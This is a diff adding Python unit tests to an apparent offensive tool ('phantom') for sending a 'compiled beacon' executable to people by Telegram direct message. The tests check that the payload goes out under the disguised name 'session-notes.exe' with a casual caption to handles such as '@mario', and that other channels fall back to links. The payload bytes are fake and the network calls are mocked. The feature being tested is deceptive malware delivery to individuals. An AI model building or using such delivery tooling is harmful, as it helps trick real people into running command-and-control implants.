@@ -201,5 +201,113 @@ class TestDMInterp(unittest.TestCase):
         self.assertIn("dm_launch", _FACT_SOURCES["dm_sent"])
 
 
+
+class TestDMFileDelivery(unittest.TestCase):
+    """Attaching the compiled beacon to a DM. Telegram is the one social
+    channel whose policy allows it; everywhere else the answer is a link."""
+
+    def _beacon(self):
+        import tempfile
+        fh = tempfile.NamedTemporaryFile(suffix=".exe", delete=False)
+        fh.write(b"MZ\x90\x00fake-pe-bytes")
+        fh.close()
+        return fh.name
+
+    def test_only_telegram_supports_files(self):
+        from phantom.automation.social.social_dm import (
+            DiscordDMTransport, TelegramDMTransport)
+        self.assertTrue(TelegramDMTransport(token="T").supports_files)
+        self.assertFalse(DiscordDMTransport(webhook="w").supports_files)
+
+    def test_base_transport_refuses_files(self):
+        from phantom.automation.social.social_dm import FakeDMTransport
+        self.assertFalse(FakeDMTransport().supports_files)
+        self.assertFalse(FakeDMTransport().send_document("x", "y.exe"))
+
+    def test_telegram_send_document_builds_multipart(self):
+        import os
+        from unittest.mock import patch
+        from phantom.automation.social.social_dm import TelegramDMTransport
+        path = self._beacon()
+        captured = {}
+
+        class _Resp:
+            def read(self):
+                return b'{"ok": true}'
+
+            def __enter__(self):
+                return self
+
+            def __exit__(self, *a):
+                return False
+
+        def fake_urlopen(req, timeout=0):
+            captured["url"] = req.full_url
+            captured["body"] = req.data
+            captured["ctype"] = req.headers.get("Content-type", "")
+            return _Resp()
+
+        try:
+            with patch("urllib.request.urlopen", fake_urlopen):
+                ok = TelegramDMTransport(token="T").send_document(
+                    "123", path, caption="here you go",
+                    filename="session-notes.exe")
+            self.assertTrue(ok)
+            self.assertTrue(captured["url"].endswith("/sendDocument"))
+            self.assertIn("multipart/form-data; boundary=",
+                          captured["ctype"])
+            body = captured["body"]
+            self.assertIn(b'MZ\x90\x00fake-pe-bytes', body)
+            self.assertIn(b'name="document"', body)
+            self.assertIn(b'filename="session-notes.exe"', body)
+            self.assertIn(b'name="chat_id"', body)
+            self.assertIn(b'name="caption"', body)
+        finally:
+            os.unlink(path)
+
+    def test_telegram_send_document_guards(self):
+        from phantom.automation.social.social_dm import TelegramDMTransport
+        self.assertFalse(TelegramDMTransport(token="").send_document("1", "x"))
+        self.assertFalse(TelegramDMTransport(token="T").send_document(
+            "1", "/nonexistent/beacon.exe"))
+
+    def test_launch_dm_file_markers(self):
+        import os
+        from phantom.automation.social.social_dm import (
+            TelegramDMTransport, launch_dm_file)
+        path = self._beacon()
+        try:
+            t = TelegramDMTransport(token="T")
+            t.send_document = lambda *a, **k: True
+            ok, lines = launch_dm_file(["@mario"], path, transport=t)
+            self.assertTrue(ok)
+            self.assertTrue(any("DM_FILE:" in l and "delivered=1" in l
+                                for l in lines))
+        finally:
+            os.unlink(path)
+
+    def test_launch_dm_file_falls_back_with_error(self):
+        import os
+        from phantom.automation.social.social_dm import (
+            DiscordDMTransport, launch_dm_file)
+        path = self._beacon()
+        try:
+            ok, lines = launch_dm_file(
+                ["webhook"], path, transport=DiscordDMTransport(webhook="w"))
+            self.assertFalse(ok)
+            self.assertTrue(any("file_delivery_unsupported" in l
+                                for l in lines))
+        finally:
+            os.unlink(path)
+
+    def test_launch_dm_file_needs_a_real_artifact(self):
+        from phantom.automation.social.social_dm import (
+            TelegramDMTransport, launch_dm_file)
+        ok, lines = launch_dm_file(["@x"], "/nope/beacon.exe",
+                                   transport=TelegramDMTransport(token="T"))
+        self.assertFalse(ok)
+        self.assertIn("ERROR", lines[0])
+
+
 if __name__ == "__main__":
     unittest.main()
